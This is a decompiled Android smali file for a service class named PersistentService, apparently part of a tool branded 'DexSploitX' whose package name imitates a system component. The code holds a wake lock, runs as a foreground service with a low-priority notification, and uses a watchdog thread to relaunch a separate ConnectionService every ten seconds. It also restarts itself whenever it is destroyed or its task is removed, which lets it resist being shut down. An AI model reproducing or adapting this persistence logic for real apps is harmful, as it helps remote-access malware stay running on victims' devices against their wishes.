.class public Lcom/system/DroidX/utils/PersistentService;
.super Landroid/app/Service;
.source "PersistentService.java"


# static fields
.field private static final CHANNEL_ID:Ljava/lang/String; = "persistent_channel"

.field private static final NOTIFICATION_ID:I = 0x3e7


# instance fields
.field private volatile isRunning:Z

.field private wakeLock:Landroid/os/PowerManager$WakeLock;

.field private watchdogThread:Ljava/lang/Thread;


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 14
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    const/4 v0, 0x0

    .line 19
    iput-boolean v0, p0, Lcom/system/DroidX/utils/PersistentService;->isRunning:Z

    return-void
.end method

.method private acquireWakeLock()V
    .locals 3

    .line 64
    const-string v0, "power"

    invoke-virtual {p0, v0}, Lcom/system/DroidX/utils/PersistentService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/os/PowerManager;

    const/4 v1, 0x1

    .line 65
    const-string v2, "DexSploitX:Persistent"

    invoke-virtual {v0, v1, v2}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    move-result-object v0

    iput-object v0, p0, Lcom/system/DroidX/utils/PersistentService;->wakeLock:Landroid/os/PowerManager$WakeLock;

    .line 66
    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->acquire()V

    return-void
.end method

.method private createNotification(Ljava/lang/String;)Landroid/app/Notification;
    .locals 2

    .line 83
    new-instance v0, Landroidx/core/app/NotificationCompat$Builder;

    const-string v1, "persistent_channel"

    invoke-direct {v0, p0, v1}, Landroidx/core/app/NotificationCompat$Builder;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    const-string v1, "DexSploitX"

    .line 84
    invoke-virtual {v0, v1}, Landroidx/core/app/NotificationCompat$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v0

    .line 85
    invoke-virtual {v0, p1}, Landroidx/core/app/NotificationCompat$Builder;->setContentText(Ljava/lang/CharSequence;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object p1

    const v0, 0x108007c

    .line 86
    invoke-virtual {p1, v0}, Landroidx/core/app/NotificationCompat$Builder;->setSmallIcon(I)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object p1

    const/4 v0, 0x1

    .line 87
    invoke-virtual {p1, v0}, Landroidx/core/app/NotificationCompat$Builder;->setOngoing(Z)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object p1

    const/4 v0, -0x1

    .line 88
    invoke-virtual {p1, v0}, Landroidx/core/app/NotificationCompat$Builder;->setPriority(I)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object p1

    .line 89
    invoke-virtual {p1}, Landroidx/core/app/NotificationCompat$Builder;->build()Landroid/app/Notification;

    move-result-object p1

    return-object p1
.end method

.method private createNotificationChannel()V
    .locals 4

    .line 70
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1a

    if-lt v0, v1, :cond_0

    .line 71
    new-instance v0, Landroid/app/NotificationChannel;

    const-string v1, "DexSploitX Persistent"

    const/4 v2, 0x2

    const-string v3, "persistent_channel"

    invoke-direct {v0, v3, v1, v2}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V

    .line 76
    const-string v1, "Keeps DexSploitX running"

    invoke-virtual {v0, v1}, Landroid/app/NotificationChannel;->setDescription(Ljava/lang/String;)V

    .line 77
    const-class v1, Landroid/app/NotificationManager;

    invoke-virtual {p0, v1}, Lcom/system/DroidX/utils/PersistentService;->getSystemService(Ljava/lang/Class;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/NotificationManager;

    .line 78
    invoke-virtual {v1, v0}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V

    :cond_0
    return-void
.end method

.method private startConnectionService()V
    .locals 2

    .line 40
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/system/DroidX/ConnectionService;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 41
    invoke-virtual {p0, v0}, Lcom/system/DroidX/utils/PersistentService;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    return-void
.end method

.method private startWatchdog()V
    .locals 2

    .line 45
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/system/DroidX/utils/PersistentService$$ExternalSyntheticLambda0;

    invoke-direct {v1, p0}, Lcom/system/DroidX/utils/PersistentService$$ExternalSyntheticLambda0;-><init>(Lcom/system/DroidX/utils/PersistentService;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    iput-object v0, p0, Lcom/system/DroidX/utils/PersistentService;->watchdogThread:Ljava/lang/Thread;

    .line 60
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method


# virtual methods
.method synthetic lambda$startWatchdog$0$com-system-DroidX-utils-PersistentService()V
    .locals 2

    .line 46
    :cond_0
    :goto_0
    iget-boolean v0, p0, Lcom/system/DroidX/utils/PersistentService;->isRunning:Z

    if-eqz v0, :cond_1

    const-wide/16 v0, 0x2710

    .line 48
    :try_start_0
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V

    .line 51
    iget-boolean v0, p0, Lcom/system/DroidX/utils/PersistentService;->isRunning:Z

    if-eqz v0, :cond_0

    .line 52
    invoke-direct {p0}, Lcom/system/DroidX/utils/PersistentService;->startConnectionService()V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    :cond_1
    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0

    const/4 p1, 0x0

    return-object p1
.end method

.method public onCreate()V
    .locals 2

    .line 23
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 24
    invoke-direct {p0}, Lcom/system/DroidX/utils/PersistentService;->createNotificationChannel()V

    .line 25
    invoke-direct {p0}, Lcom/system/DroidX/utils/PersistentService;->acquireWakeLock()V

    .line 26
    const-string v0, "DexSploitX Running"

    invoke-direct {p0, v0}, Lcom/system/DroidX/utils/PersistentService;->createNotification(Ljava/lang/String;)Landroid/app/Notification;

    move-result-object v0

    const/16 v1, 0x3e7

    invoke-virtual {p0, v1, v0}, Lcom/system/DroidX/utils/PersistentService;->startForeground(ILandroid/app/Notification;)V

    return-void
.end method

.method public onDestroy()V
    .locals 2

    const/4 v0, 0x0

    .line 99
    iput-boolean v0, p0, Lcom/system/DroidX/utils/PersistentService;->isRunning:Z

    .line 100
    iget-object v0, p0, Lcom/system/DroidX/utils/PersistentService;->watchdogThread:Ljava/lang/Thread;

    if-eqz v0, :cond_0

    .line 101
    invoke-virtual {v0}, Ljava/lang/Thread;->interrupt()V

    .line 103
    :cond_0
    iget-object v0, p0, Lcom/system/DroidX/utils/PersistentService;->wakeLock:Landroid/os/PowerManager$WakeLock;

    if-eqz v0, :cond_1

    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->isHeld()Z

    move-result v0

    if-eqz v0, :cond_1

    .line 104
    iget-object v0, p0, Lcom/system/DroidX/utils/PersistentService;->wakeLock:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->release()V

    .line 108
    :cond_1
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/system/DroidX/utils/PersistentService;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 109
    invoke-virtual {p0, v0}, Lcom/system/DroidX/utils/PersistentService;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 111
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 0

    .line 31
    iget-boolean p1, p0, Lcom/system/DroidX/utils/PersistentService;->isRunning:Z

    const/4 p2, 0x1

    if-nez p1, :cond_0

    .line 32
    iput-boolean p2, p0, Lcom/system/DroidX/utils/PersistentService;->isRunning:Z

    .line 33
    invoke-direct {p0}, Lcom/system/DroidX/utils/PersistentService;->startConnectionService()V

    .line 34
    invoke-direct {p0}, Lcom/system/DroidX/utils/PersistentService;->startWatchdog()V

    :cond_0
    return p2
.end method

.method public onTaskRemoved(Landroid/content/Intent;)V
    .locals 2

    .line 117
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/system/DroidX/utils/PersistentService;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 118
    invoke-virtual {p0, v0}, Lcom/system/DroidX/utils/PersistentService;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 119
    invoke-super {p0, p1}, Landroid/app/Service;->onTaskRemoved(Landroid/content/Intent;)V

    return-void
.end method
